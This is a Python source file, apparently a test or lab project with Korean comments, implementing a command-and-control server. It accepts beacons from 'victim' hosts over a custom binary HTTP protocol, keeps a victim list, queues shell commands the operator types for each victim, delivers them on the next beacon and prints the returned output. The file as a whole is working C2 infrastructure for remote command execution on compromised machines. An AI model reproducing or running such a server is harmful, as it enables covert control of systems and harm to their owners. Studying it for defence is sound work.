#!/usr/bin/env python3
# pip install scapy

from http.server import BaseHTTPRequestHandler, HTTPServer
from struct import unpack, pack
from scapy.all import *
from collections import deque

import threading
import sys


# 커스텀 프로토콜의 타입을 정의해둔 클래스
class TypeTable:
    TYPE_LIST = {
        'ERROR' :  b'\x00',          
        'BEACON_REQUEST' : b'\x01',     
        'BEACON_RESPONSE' : b'\x02',    
        'SHELL_REQUEST' : b'\x03',     
        'SHELL_RESPONSE' : b'\x04',    
        'FTP_REQUEST' : b'\x05',        
        'FTP_RESPONSE' : b'\x06',
        'NONE' : b'\x10'
    }


class CustomProtocol(TypeTable):
    Header = b'\xDD'
    type = b''
    length = b''
    sequence = b''
    data = b""

    # 헤더 값 구성
    def __init__(self, type : str, seq : int, data : bytes) -> None:
        self.type = self.TYPE_LIST[type]
        self.length = len(data).to_bytes(2, byteorder="little")
        self.sequence = seq.to_bytes(4, byteorder="little")
        self.data = data

    # 헤더 값들을 byte 타입으로 리턴
    def __bytes__(self) -> bytes:
        return self.Header + self.type + self.length + self.sequence + self.data


class HTTPHandler(TypeTable, BaseHTTPRequestHandler):
    
    # hex 값에 따른 type string을 리턴
    def _get_type(self, type_num):
        for k, v in self.TYPE_LIST.items():
            if v == type_num.to_bytes(1, byteorder="little"):
                return k

    def _raw_data_parsing(self, raw_data):
        result = {}
        result['header'] = hex(raw_data[0])
        result['type'] = self._get_type(raw_data[1])
        result['length'] = unpack('<L', raw_data[2:4].ljust(4, b'\x00'))[0]
        result['sequence'] = unpack('<L', raw_data[4:8])[0]
        result['data'] = raw_data[8:9+result['length']]
        
        return result
    
    # parsing된 데이터 출력 메서드
    def _print_parsed_data(self, parsed_data):
        print('==parsed data==')
        for header, value in parsed_data.items():
            if header == 'data':
                value = value.decode('utf-8')
            print('{0} : {1}'.format(header, value))

    # 기본 헤더 정의
    def _set_header(self, header={}):
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain; charset=utf-8')

        if len(header) > 0:
            for k, v in header.items():
                self.send_header(k, v)

        self.end_headers()

    # 큐에 들어있는 값 pop
    def _pop_queue(self, ip):
        global COMMAND_QUEUE

        command = b""

        if ip not in COMMAND_QUEUE or len(COMMAND_QUEUE[ip]) < 1:
            return False

        queue = COMMAND_QUEUE[ip]

        print(queue)

        while queue:
            command += queue.popleft() + b";"
        return command[:-1]

    # command response
    def _command_execute_response(self, command : bytes):
        self._set_header()
        protocol_data = bytes(CustomProtocol('SHELL_REQUEST', 0, command))
        self.wfile.write(protocol_data)

    # ack response
    def _becon_ack_response(self):
        self._set_header()
        protocol_data = bytes(CustomProtocol('NONE', 0, b''))
        self.wfile.write(protocol_data)
    
    # victim 딕셔너리에 ip 추가
    def _add_victim_ip(self, ip):
        global VICTIM_LIST
        global COMMAND_QUEUE
        global SEQUENCE_DATA
        if ip not in VICTIM_LIST:
            VICTIM_LIST[ip] = ip
            COMMAND_QUEUE[ip] = deque()
            SEQUENCE_DATA[ip] = [1, b""]

    def _check_sequence(self, seq, data, client_ip):
        global SEQUENCE_DATA

        next_sequence_num = SEQUENCE_DATA[client_ip][0]

        if seq == next_sequence_num:
            SEQUENCE_DATA[client_ip][1] += data
            SEQUENCE_DATA[client_ip][0] += 1
        elif seq != 0:
            raise Exception("Invalid Sequence / {0}".format(seq))
        elif seq == 0 and next_sequence_num != 1:
            print('==splited data==\n{}\n'.format(SEQUENCE_DATA[client_ip][1]))
            SEQUENCE_DATA[client_ip][1] = b""
            SEQUENCE_DATA[client_ip][0] = 1

    # POST 요청이 들어올 시 처리해주는 코드
    def do_POST(self):

        data_string = self.rfile.read(int(self.headers['Content-Length'])) # post body data를 읽어서 data_string에 저장
        client_ip = self.client_address[0]                                 # 접속 ip get

        # try except 문으로 에러 핸들링
        try:
            # 최소 길이 만족 못하면 에러 발생
            if len(data_string) < 8:
                raise Exception("Protocol Header Error")

            # body data를 커스텀 프로토콜에 맞춰 파싱 후 출력
            parsed_data = self._raw_data_parsing(data_string)
            self._print_parsed_data(parsed_data)

            # magic 값 검증
            if parsed_data['header'] != '0xdd':
                raise Exception("Magic Header Error / {} != 0xdd".format(parsed_data['header']))

            # ip를 딕셔너리들에 추가
            self._add_victim_ip(client_ip)

            # sequence 처리
            self._check_sequence(parsed_data['sequence'], parsed_data['data'], client_ip)
            
        except Exception as e:
            # 오류 발생시 오류 문구를 리턴
            self._set_header()
            self.wfile.write('[!] Invalid Header\nError Message : {}'.format(str(e)).encode('utf-8'))
            return

        # type 별 처리
        if parsed_data['type'] == 'BEACON_REQUEST': # BEACON_REQUEST
            command = self._pop_queue(client_ip)

            if command:
                self._command_execute_response(command)
                print('[*] send command\n[*] target : {0}\n[*] command : {1}'.format(client_ip, command))
            else:
                self._becon_ack_response()
        elif parsed_data['type'] == 'SHELL_RESPONSE': # SHELL_RESPONSE
            print('[*] execute result\n{}'.format(parsed_data['data'].decode('utf-8')))
            self._becon_ack_response()
        else:
            self._becon_ack_response()

        # 예쁘게 출력하기 위한 코드
        print()
        print_victims()
        print('> ', end='')



# 서버 주소와 포트
# 자신의 ip, port로 설정
SERVER_INFO = ('192.168.21.1', 2022)

# 피해자 ip 및 여러 정보들을 담을 딕셔너리
VICTIM_LIST = {} # hostname : ip 
COMMAND_QUEUE = {} # ip : command queue
SEQUENCE_DATA = {} # ip : [next sequence num, data]

menu_message = '''==Test C&C Server==
Enter the command sending to the victim
ex) [victim name]|[command]'''

print(menu_message)

# hostname와 매칭하여 사용자가 입력한 command를 큐에 저장
def add_command(victim_name, command):
    COMMAND_QUEUE[VICTIM_LIST[victim_name]].append(bytes(command, 'utf-8'))

# victim 목록 출력
def print_victims():
    if len(VICTIM_LIST) < 0:
        return
    print('=Victim List=')
    for ip, name in VICTIM_LIST.items():
        print('{} | {} | {}'.format(ip, name, list(COMMAND_QUEUE[ip])))

# HTTP Server를 open하는 코드
try:
    httpd = HTTPServer(SERVER_INFO, HTTPHandler)

    http_server_thread = threading.Thread(target=httpd.serve_forever)
    http_server_thread.start()
except Exception as e:
    print('[!] HTTP Server Open Error / {}'.format(str(e)))
    exit(0)

# <hostname>|<command> 방식으로 입력된 데이터를 파싱하여 큐에 저장
while True:
    print_victims()
    try:
        victim, command = input('> ').split('|')
    except:
        print('[!] invalid command\n')
        continue

    if victim in VICTIM_LIST:
        add_command(victim, command)
    else:
        print('[!] victims not found\n')